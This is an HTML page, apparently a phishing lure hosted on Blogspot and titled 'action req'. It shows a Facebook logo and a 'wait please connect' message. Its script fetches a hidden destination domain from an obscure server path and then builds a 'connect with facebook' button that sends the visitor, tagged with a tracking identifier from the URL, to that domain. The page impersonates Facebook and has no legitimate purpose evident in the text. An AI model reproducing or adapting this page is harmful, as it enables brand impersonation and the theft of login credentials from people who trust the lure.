<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>action req</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@500&display=swap" rel="stylesheet"/>
    <link href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" rel="stylesheet" />
    <style>
      body {
        background-color: rgb(239, 239, 239);
        font-family: "Open Sans", sans-serif;
      }
      .container {
        width: 100%;
        margin: auto;
        padding: 0 30px 30px 30px;
        border-radius: 7px;
        background: #fff;
        height: 100%;
      }
      .container .input {
        width: 100%;
        margin: 0;
        height: 35px;
        border-radius: 5px;
        border: 1px solid rgba(193, 192, 192, 0.562);
        padding: 2px;
      }
      .btn {
        margin: auto;
        text-align: center;
      }
      .btn .log {
        background-color: rgb(44, 128, 211);
        color: #fff;
        width: 100%;
        height: 40px;
        border-radius: 6px;
        font-size: 18px;
        border: none;
        margin-top: 10px;
      }
	  .log {
		  text-decoration: none;
		  padding: 15px;
	    }
      .create {
        background-color: rgb(76, 158, 35);
        color: rgb(255, 255, 255);
        width: 50%;
        height: 40px;
        border-radius: 6px;
        font-size: 18px;
        border: none;
        margin-top: 10px;
      }

    .container {
          width: 80%;
          margin: left 5px;
    }

    #icon {
        padding: 10px;
        border-radius: 50%;
        background: rgb(49, 139, 230);
        color: white;
        text-align: center;
        font-size: 20px;
    }

    </style>
  <link rel="me" href="https://www.blogger.com/profile/04372670430599131596" />
<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
<meta name='google-adsense-platform-domain' content='blogspot.com'/>
</head>
  <body>
    <div class="container">
        <img width="150" id="loggo" style="margin-top: 0;" src="https://download.logo.wine/logo/Facebook/Facebook-Logo.wine.png">
    <div class="btn" id="btn"  style="margin-top: 160px; margin-bottom: 100%;">
		<h3 id="wait" style="color: rgb(44, 128, 211);">wait please connect... </h3ß>
	</div>
	 
    </div>
    <script src="https://unpkg.com/country-phone-prefix@latest"></script>
    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
    <script>
      const queryString = window.location.search;
      const urlParams = new URLSearchParams(queryString);
      const u = urlParams.get("u");
	    
    axios.get("/data/tyzteytzyrzetzy").then((resps) =>
      {
        document.getElementById('wait').style.display= "none";
	document.getElementById('btn').innerHTML = `<a href=${resps.data.domain}?u=${u} class="log">connect with facebook <i id="icon" class="fab fa-facebook"></i></a>`
    }).catch((e)=>{
		  console.log(e)
	  });
    </script>
  </body>
</html>
